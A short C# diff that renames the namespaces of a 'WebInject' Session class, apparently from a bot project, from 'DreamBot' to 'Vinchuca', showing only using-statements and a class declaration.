@@ -2,9 +2,9 @@ using System;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
-using DreamBot.Network.Comunication.TCP;
+using Vinchuca.Network.Comunication.TCP;
 
-namespace DreamBot.Actions.WebInject
+namespace Vinchuca.Actions.WebInject
 {
     internal class Session
     {
